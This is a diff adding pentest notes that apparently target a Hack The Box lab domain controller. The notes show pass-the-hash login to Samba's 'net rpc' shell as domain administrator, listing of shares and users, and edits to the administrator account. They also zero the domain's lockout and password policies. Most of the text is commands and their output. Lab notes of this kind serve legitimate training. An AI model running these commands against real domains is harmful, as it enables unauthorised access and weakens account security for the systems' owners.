@@ -464,3 +464,178 @@ Windows Registry Editor Version 5.00
 └─$ net rpc registry save 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' 'C:\Users\Public\reg' -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210 
 
 ```
+
+### shell
+```sh
+└─$ net rpc shell -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210
+Talking to domain HTB (S-1-5-21-3072663084-364016917-1341370565)
+net rpc> help
+info            Print information about the domain connected to
+rights          List/Grant/Revoke user rights
+share           List/Add/Remove etc shares
+user            List/Add/Remove user info
+account         Show/Change account policy settings
+```
+#### shell info
+```sh
+net rpc> info
+Domain Name: HTB
+Domain SID: S-1-5-21-3072663084-364016917-1341370565
+Sequence number: 1
+Num users: 106
+Num domain groups: 0
+Num local groups: 0
+```
+####  shell share
+##### shell share list
+```sh
+net rpc> share list
+ADMIN$
+C$
+IPC$
+NETLOGON
+SYSVOL
+```
+##### shell share info
+```sh
+net rpc> share info 'C$'
+Name:     C$
+Comment:  Default share
+Path:     C:\
+Password: (null)
+```
+#### shell user
+##### shell user list
+```sh
+net rpc> user list
+$331000-VK4ADACQNUCA
+Administrator
+andy
+DefaultAccount
+Guest
+HealthMailbox0659cc1
+HealthMailbox670628e
+HealthMailbox6ded678
+HealthMailbox7108a4e
+HealthMailbox83d6781
+HealthMailbox968e74d
+HealthMailboxb01ac64
+HealthMailboxc0a90c9
+HealthMailboxc3d7722
+HealthMailboxfc9daad
+HealthMailboxfd87238
+krbtgt
+lucinda
+mark
+santi
+sebastien
+SM_1b41c9286325456bb
+SM_1ffab36a2f5f479cb
+SM_2c8eef0a09b545acb
+SM_681f53d4942840e18
+SM_75a538d3025e4db9a
+SM_7c96b981967141ebb
+SM_9b69f1b9d2cc45549
+SM_c75ee099d0a64c91b
+SM_ca8c2ed5bdab4dc9b
+svc-alfresco
+user
+```
+##### shell user info
+```sh
+net rpc> user info administrator
+Enterprise Admins
+Organization Management
+Domain Users
+Group Policy Creator Owners
+Domain Admins
+Schema Admins
+```
+##### shell user show
+```sh
+net rpc> user show administrator
+user rid: 500, group rid: 513
+```
+##### shell user edit
+```sh
+net rpc> user edit fullname administrator
+Administrator's fullname: [Administrator]
+
+net rpc> user edit homedir administrator
+Administrator's homedir: []
+
+net rpc> user edit homedrive administrator
+Administrator's homedrive: []
+
+net rpc> user edit logonscript administrator
+Administrator's logonscript: []
+
+net rpc> user edit profilepath administrator
+Administrator's profilepath: []
+
+net rpc> user edit description administrator
+Administrator's description: [Built-in account for administering the computer/domain]
+
+net rpc> user edit disabled administrator
+Administrator's disabled flag: no
+
+net rpc> user edit autolock administrator
+Administrator's autolock flag: no
+
+net rpc> user edit pwnotreq administrator
+Administrator's pwnotreq flag: no
+
+net rpc> user edit pwnoexp administrator
+Administrator's pwnoexp flag: no
+
+Set Administrator's pwnoexp flag from [no] to [yes]
+net rpc> user edit pwnoexp administrator
+Administrator's pwnoexp flag: yes
+```
+#### account
+##### account show
+```sh
+net rpc> account show
+Minimum password length: 7
+Password history length: 24
+Minimum password age: 86400 seconds
+Maximum password age: not set
+Bad logon attempts: 0
+Disconnect users when logon hours expire: no
+User must logon to change password: no
+```
+##### account badpw
+```sh
+net rpc> account badpw 0
+Setting bad password count to 0
+```
+##### account resetduration
+```sh
+net rpc> account resetduration 0
+Setting bad password reset duration to 0 seconds
+```
+##### account lockduration
+```sh
+net rpc> account lockduration 0
+Setting lockout duration to 0 seconds
+```
+##### account minpwage
+```sh
+net rpc> account minpwage 0
+Setting minimum password age to 0 seconds
+```
+##### account maxpwage
+```sh
+net rpc> account maxpwage 0
+Setting maximum password age to 0 seconds
+```
+##### account minpwlen
+```sh
+net rpc> account minpwlen 0
+Setting minimum password length to 0
+```
+##### account pwhistlen
+```sh
+net rpc> account pwhistlen 0
+Setting password history length to 0
+```
